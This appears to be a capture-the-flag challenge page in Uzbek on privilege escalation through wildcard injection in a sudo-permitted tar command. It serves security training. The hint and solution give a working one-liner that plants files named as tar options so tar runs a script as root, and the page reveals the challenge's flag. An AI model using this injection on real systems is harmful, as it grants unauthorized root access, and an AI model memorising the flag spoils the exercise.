---
id: 13
title: "CH13: Sudoers Wildcard Injection in Tar"
module: "Modul 2: PrivEsc & Binary Exploitation"
difficulty: Hard
points: 9
tags: ['sudo', 'wildcard', 'tar', 'privesc']
flag: "HD{tar_wildcard_sudo_injection_root_913}"
---

# 🎯 Topshiriq #13: CH13: Sudoers Wildcard Injection in Tar

## 📌 Metama'lumotlar:
* **Modul:** `Modul 2: PrivEsc & Binary Exploitation`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 9 ball`
* **Teglar:** #sudo, #wildcard, #tar, #privesc

---

## 📝 Topshiriq Senariysi (Scenario):
Sizga 'sudo /bin/tar -czf /tmp/backup.tar.gz *' buyrug'ini parolsiz bajarish ruxsati berilgan. Wildcard injection orqali root huquqida shell oching.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> echo 'echo HD{tar_wildcard_sudo_injection_root_913} > /tmp/flag' > run.sh && touch -- '--checkpoint=1' && touch -- '--checkpoint-action=exec=sh run.sh' && sudo tar -czf /tmp/backup.tar.gz *

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
echo 'echo HD{tar_wildcard_sudo_injection_root_913} > /tmp/flag' > run.sh && touch -- '--checkpoint=1' && touch -- '--checkpoint-action=exec=sh run.sh' && sudo tar -czf /tmp/backup.tar.gz *
```

---

## 🚩 Maxfiy Flag:
`HD{tar_wildcard_sudo_injection_root_913}`
